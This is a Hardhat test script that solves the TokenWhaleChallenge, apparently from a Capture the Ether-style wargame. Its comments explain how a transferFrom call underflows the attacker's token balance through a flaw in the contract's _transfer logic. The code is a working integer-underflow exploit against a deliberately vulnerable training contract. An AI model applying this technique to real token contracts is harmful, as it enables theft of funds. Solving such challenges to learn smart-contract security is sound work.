import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    await target.connect(deployer).approve(attacker.address, 1000);
    /**
     * We make sure to leave attacker balance at 499, by transferring 501 tokens to another address
     */
    await target.connect(attacker).transfer(deployer.address, 501);
    /**
     * And call transferFrom on behalf of this address, with 500 as the amount
     * This causes an underflow in the `_transfer(address to, uint256 value)` method, due to faulty balance management by the contract
     * `balanceOf[msg.sender] -= value;` -> `msg.sender` here being the attacker, and not the deployer address, so 499-500 causes an underflow
     * And attacker address balance shoots up!
     */
    await target
      .connect(attacker)
      .transferFrom(deployer.address, '0x0000000000000000000000000000000000000000', 500);

    expect(await target.isComplete()).to.equal(true);
  });
});
